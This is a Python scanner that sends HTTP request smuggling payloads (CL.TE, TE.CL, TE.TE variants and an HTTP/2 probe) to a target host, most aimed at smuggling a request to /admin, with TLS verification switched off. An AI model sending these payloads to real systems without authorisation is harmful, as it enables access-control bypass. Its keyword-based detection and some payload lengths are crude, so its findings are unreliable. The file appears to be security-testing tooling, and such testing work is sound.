"""Deep HTTP request smuggling detection — CL.TE, TE.CL, TE.TE, HTTP/2, response diff, timing."""

import asyncio
import ssl
import time
import httpx
import re


# --- CL.TE Payloads ---
CL_TE_PAYLOADS = [
    (
        "basic_cl_te",
        "POST / HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "X",
        "Smuggled request appended after 0-length chunk",
    ),
    (
        "cl_te_admin",
        "POST / HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "Content-Length: 44\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "GET /admin HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "\r\n",
        "Admin path smuggling via CL.TE",
    ),
    (
        "cl_te_chunked",
        "POST / HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "Content-Length: 8\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "G",
        "Partial GET smuggling",
    ),
    (
        "cl_te_upgrade",
        "POST / HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "Content-Length: 34\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "GET / HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "\r\n",
        "Request upgrade smuggling",
    ),
]

# --- TE.CL Payloads ---
TE_CL_PAYLOADS = [
    (
        "basic_te_cl",
        "POST / HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "Content-Length: 3\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "8\r\n"
        "SMUGGLED\r\n"
        "0\r\n"
        "\r\n"
        "\r\n",
        "Basic TE.CL smuggling",
    ),
    (
        "te_cl_admin",
        "POST / HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "5c\r\n"
        "GET /admin HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "Content-Length: 15\r\n"
        "\r\n"
        "0\r\n"
        "\r\n",
        "Admin path smuggling via TE.CL",
    ),
    (
        "te_cl_overflow",
        "POST / HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "Content-Length: 5\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "0\r\n"
        "\r\n"
        "GET /admin HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "\r\n",
        "Chunk size overflow smuggling",
    ),
]

# --- TE.TE Payloads ---
TE_TE_PAYLOADS = [
    (
        "te_te_obfuscation",
        "POST / HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Transfer-Encoding: identity\r\n"
        "\r\n"
        "5c\r\n"
        "GET /admin HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "Content-Length: 15\r\n"
        "\r\n"
        "0\r\n"
        "\r\n",
        "TE.TE with Transfer-Encoding obfuscation",
    ),
    (
        "te_te_spaces",
        "POST / HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding : chunked\r\n"
        "\r\n"
        "5c\r\n"
        "GET /admin HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "Content-Length: 15\r\n"
        "\r\n"
        "0\r\n"
        "\r\n",
        "TE.TE with space in header name",
    ),
    (
        "te_te_tab",
        "POST / HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding\t:\tchunked\r\n"
        "\r\n"
        "5c\r\n"
        "GET /admin HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "Content-Length: 15\r\n"
        "\r\n"
        "0\r\n"
        "\r\n",
        "TE.TE with tab obfuscation",
    ),
]

# --- HTTP/2 Smuggling ---
HTTP2_PAYLOADS = [
    (
        "h2_cl_override",
        {
            "method": "POST",
            "path": "/",
            "headers": [
                (b":method", b"POST"),
                (b":path", b"/"),
                (b":authority", b"{host}"),
                (b"content-length", b"0"),
                (b"transfer-encoding", b"chunked"),
            ],
            "body": b"0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {host}\r\n\r\n",
        },
        "HTTP/2 CL override smuggling",
    ),
    (
        "h2_te_inject",
        {
            "method": "POST",
            "path": "/",
            "headers": [
                (b":method", b"POST"),
                (b":path", b"/"),
                (b":authority", b"{host}"),
                (b"transfer-encoding", b"chunked"),
            ],
            "body": b"0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {host}\r\n\r\n",
        },
        "HTTP/2 TE injection smuggling",
    ),
]


def _detect_smuggling_evidence(response_text: str, response_bytes: bytes) -> dict:
    """Analyze response for smuggling evidence."""
    evidence = {
        "admin_accessed": False,
        "method_leak": False,
        "path_leak": False,
        "error_injection": False,
        "response_split": False,
        "details": [],
    }

    lower = response_text.lower()

    # Check for admin access
    if any(kw in lower for kw in ["admin", "welcome", "dashboard", "control panel", "management"]):
        evidence["admin_accessed"] = True
        evidence["details"].append("Admin panel accessed")

    # Check for method leak
    if re.search(r'HTTP/1\.\d 200.*GET.*HTTP/1\.\d', response_text, re.DOTALL):
        evidence["method_leak"] = True
        evidence["details"].append("HTTP method leaked in response")

    # Check for path injection
    if "/admin" in response_text and "200" in response_text[:100]:
        evidence["path_leak"] = True
        evidence["details"].append("Injected path reflected in response")

    # Check for error-based detection
    if any(kw in lower for kw in ["bad request", "invalid chunk", "transfer-encoding"]):
        evidence["error_injection"] = True
        evidence["details"].append("Error response indicates TE/CL confusion")

    # Check for response splitting
    if response_text.count("HTTP/1.1") > 1:
        evidence["response_split"] = True
        evidence["details"].append("Multiple HTTP responses detected (response splitting)")

    return evidence


async def _test_http2_smuggling(host: str, port: int, payload: dict) -> dict:
    """Test HTTP/2 smuggling if possible."""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port, ssl=ctx),
            timeout=10,
        )

        # Send HTTP/2 connection preface
        writer.write(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
        await writer.drain()

        # Read server settings
        try:
            settings_frame = await asyncio.wait_for(reader.read(4096), timeout=5)
        except asyncio.TimeoutError:
            settings_frame = b""

        writer.close()
        return {"supported": len(settings_frame) > 0, "settings": settings_frame[:100]}
    except Exception as e:
        return {"supported": False, "error": str(e)}


async def smuggling_check(target: str) -> dict:
    """Deep HTTP request smuggling detection with CL.TE, TE.CL, TE.TE, HTTP/2, response diff, timing."""
    host = target.split(":")[0].replace("https://", "").replace("http://", "")
    is_https = target.startswith("https")
    port = 443 if is_https else 80

    results = []

    # --- CL.TE Tests ---
    for name, payload_template, description in CL_TE_PAYLOADS:
        try:
            payload = payload_template.replace("{host}", host)
            ctx = ssl.create_default_context() if is_https else None
            if ctx:
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE

            r, w = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=ctx),
                timeout=10,
            )
            w.write(payload.encode())
            await w.drain()

            resp = b""
            try:
                while True:
                    chunk = await asyncio.wait_for(r.read(4096), timeout=5)
                    if not chunk:
                        break
                    resp += chunk
            except asyncio.TimeoutError:
                pass
            w.close()

            text = resp.decode(errors="replace")
            evidence = _detect_smuggling_evidence(text, resp)
            vulnerable = evidence["admin_accessed"] or evidence["response_split"] or evidence["method_leak"]

            results.append({
                "type": name,
                "technique": "CL.TE",
                "description": description,
                "vulnerable": vulnerable,
                "evidence": evidence,
                "response_preview": text[:300],
                "risk": "CRITICAL" if vulnerable else "NONE",
            })
        except Exception as e:
            results.append({
                "type": name,
                "technique": "CL.TE",
                "vulnerable": False,
                "error": str(e),
            })

    # --- TE.CL Tests ---
    for name, payload_template, description in TE_CL_PAYLOADS:
        try:
            payload = payload_template.replace("{host}", host)
            ctx = ssl.create_default_context() if is_https else None
            if ctx:
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE

            r, w = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=ctx),
                timeout=10,
            )
            w.write(payload.encode())
            await w.drain()

            resp = b""
            try:
                while True:
                    chunk = await asyncio.wait_for(r.read(4096), timeout=5)
                    if not chunk:
                        break
                    resp += chunk
            except asyncio.TimeoutError:
                pass
            w.close()

            text = resp.decode(errors="replace")
            evidence = _detect_smuggling_evidence(text, resp)
            vulnerable = evidence["admin_accessed"] or evidence["response_split"] or evidence["method_leak"]

            results.append({
                "type": name,
                "technique": "TE.CL",
                "description": description,
                "vulnerable": vulnerable,
                "evidence": evidence,
                "response_preview": text[:300],
                "risk": "CRITICAL" if vulnerable else "NONE",
            })
        except Exception as e:
            results.append({
                "type": name,
                "technique": "TE.CL",
                "vulnerable": False,
                "error": str(e),
            })

    # --- TE.TE Tests ---
    for name, payload_template, description in TE_TE_PAYLOADS:
        try:
            payload = payload_template.replace("{host}", host)
            ctx = ssl.create_default_context() if is_https else None
            if ctx:
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE

            r, w = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=ctx),
                timeout=10,
            )
            w.write(payload.encode())
            await w.drain()

            resp = b""
            try:
                while True:
                    chunk = await asyncio.wait_for(r.read(4096), timeout=5)
                    if not chunk:
                        break
                    resp += chunk
            except asyncio.TimeoutError:
                pass
            w.close()

            text = resp.decode(errors="replace")
            evidence = _detect_smuggling_evidence(text, resp)
            vulnerable = evidence["admin_accessed"] or evidence["response_split"] or evidence["method_leak"]

            results.append({
                "type": name,
                "technique": "TE.TE",
                "description": description,
                "vulnerable": vulnerable,
                "evidence": evidence,
                "response_preview": text[:300],
                "risk": "CRITICAL" if vulnerable else "NONE",
            })
        except Exception as e:
            results.append({
                "type": name,
                "technique": "TE.TE",
                "vulnerable": False,
                "error": str(e),
            })

    # --- HTTP/2 Detection ---
    h2_support = await _test_http2_smuggling(host, port, {})
    if h2_support.get("supported"):
        results.append({
            "type": "http2_detection",
            "technique": "HTTP/2",
            "description": "Server supports HTTP/2 — may be vulnerable to H2.CL or H2.TE smuggling",
            "h2_settings": h2_support.get("settings", ""),
            "risk": "MEDIUM",
        })

    # --- Timing-based Detection ---
    try:
        timing_payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"5c\r\n"
            f"GET /admin HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 15\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
        )
        ctx = ssl.create_default_context() if is_https else None
        if ctx:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

        start_time = time.time()
        r, w = await asyncio.wait_for(
            asyncio.open_connection(host, port, ssl=ctx),
            timeout=10,
        )
        w.write(timing_payload.encode())
        await w.drain()

        resp = b""
        try:
            while True:
                chunk = await asyncio.wait_for(r.read(4096), timeout=5)
                if not chunk:
                    break
                resp += chunk
        except asyncio.TimeoutError:
            pass
        elapsed = time.time() - start_time
        w.close()

        text = resp.decode(errors="replace")
        evidence = _detect_smuggling_evidence(text, resp)

        results.append({
            "type": "timing_based",
            "technique": "Timing",
            "elapsed_seconds": round(elapsed, 3),
            "vulnerable": evidence["admin_accessed"],
            "evidence": evidence,
            "risk": "HIGH" if evidence["admin_accessed"] else "NONE",
        })
    except Exception as e:
        results.append({
            "type": "timing_based",
            "technique": "Timing",
            "error": str(e),
        })

    vulnerable_results = [r for r in results if r.get("vulnerable")]

    return {
        "target": host,
        "port": port,
        "is_https": is_https,
        "http2_supported": h2_support.get("supported", False),
        "tests": results,
        "smuggling_vulnerable": len(vulnerable_results) > 0,
        "total_vulnerable": len(vulnerable_results),
        "techniques_found": list(set(r["technique"] for r in vulnerable_results)),
        "risk_summary": {
            "critical": sum(1 for r in vulnerable_results if r.get("risk") == "CRITICAL"),
            "high": sum(1 for r in vulnerable_results if r.get("risk") == "HIGH"),
            "medium": sum(1 for r in results if r.get("risk") == "MEDIUM"),
        },
    }
